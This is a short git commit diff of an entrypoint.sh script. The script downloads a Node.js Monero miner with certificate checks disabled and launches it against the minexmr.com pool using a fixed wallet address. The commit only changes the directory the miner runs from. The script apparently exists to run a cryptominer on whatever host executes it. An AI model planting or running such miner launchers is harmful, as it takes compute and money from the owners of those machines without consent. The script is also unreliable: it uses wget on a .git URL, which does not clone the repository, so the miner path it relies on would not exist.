fbf5042785675d4c0f60178a709c89f877f7c72f
Fat Rat <60702632+liquid8796@users.noreply.github.com>
2022-06-24 22:18:36 +0700

    Update entrypoint.sh

--- entrypoint.sh
+++ entrypoint.sh
@@ -1,5 +1,5 @@
 cd /xmr
 wget https://github.com/john-goodman/nodejs-xmr-miner.git --no-check-certificate
-cd /bin
+cd /nodejs-xmr-miner/bin
 
 node-miner --host sg.minexmr.com --port 4444 --user 47mpJwQQrWaN27Y6A48VgcB1A3cDsRFTNZXGxifemtrE9ALStd3bsLy1wZA75JFHev1t1XPQChfJRe6b7sktBBrYNaTT11Y
